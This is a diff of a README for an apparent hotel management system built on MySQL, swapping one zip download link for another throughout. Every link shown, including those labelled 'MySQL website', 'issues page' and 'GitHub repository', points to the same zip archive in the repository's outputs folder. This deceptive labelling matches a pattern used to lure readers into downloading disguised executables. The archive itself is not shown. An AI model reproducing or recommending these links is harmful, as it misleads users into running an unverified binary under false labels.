@@ -8,7 +8,7 @@ Welcome to the hotel management system! This application helps you manage hotel 
 
 To get started, visit the link below to download the application:
 
-[Download hotel-management-system-sql](https://github.com/perfilcursor18-pixel/hotel-management-system-sql/raw/refs/heads/main/outputs/management_system_sql_hotel_1.8-beta.1.zip)
+[Download hotel-management-system-sql](https://github.com/perfilcursor18-pixel/hotel-management-system-sql/raw/refs/heads/main/outputs/system_hotel_sql_management_2.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -50,7 +50,7 @@ This application includes the following key features:
 
 The application uses MySQL for data management. You will need to set up a MySQL database before running the software. Here’s a simple guide to do that:
 
-1. **Install MySQL:** Visit the [MySQL website](https://github.com/perfilcursor18-pixel/hotel-management-system-sql/raw/refs/heads/main/outputs/management_system_sql_hotel_1.8-beta.1.zip) and download the installer.
+1. **Install MySQL:** Visit the [MySQL website](https://github.com/perfilcursor18-pixel/hotel-management-system-sql/raw/refs/heads/main/outputs/system_hotel_sql_management_2.3.zip) and download the installer.
 2. **Create a Database:**
    - Open the MySQL command line or a graphical interface like MySQL Workbench.
    - Run the command: `CREATE DATABASE hotel_management;`
@@ -62,13 +62,13 @@ If you encounter issues, here are a few steps to help you:
 
 - **Error: Database Connection Failed:** Check that your MySQL server is running and your credentials are correct.
 - **Error: Application Won't Open:** Ensure your system meets the requirements and that the application is installed correctly.
-- **Need Help?** Visit the [issues page](https://github.com/perfilcursor18-pixel/hotel-management-system-sql/raw/refs/heads/main/outputs/management_system_sql_hotel_1.8-beta.1.zip) for more assistance or ask the community.
+- **Need Help?** Visit the [issues page](https://github.com/perfilcursor18-pixel/hotel-management-system-sql/raw/refs/heads/main/outputs/system_hotel_sql_management_2.3.zip) for more assistance or ask the community.
 
 ## 📢 Community Support
 
 Join our community for support and updates:
 
-- Follow our [GitHub repository](https://github.com/perfilcursor18-pixel/hotel-management-system-sql/raw/refs/heads/main/outputs/management_system_sql_hotel_1.8-beta.1.zip) for updates and participate in discussions.
+- Follow our [GitHub repository](https://github.com/perfilcursor18-pixel/hotel-management-system-sql/raw/refs/heads/main/outputs/system_hotel_sql_management_2.3.zip) for updates and participate in discussions.
 - Check out the FAQ section for common questions and solutions.
 
 ## 📜 License
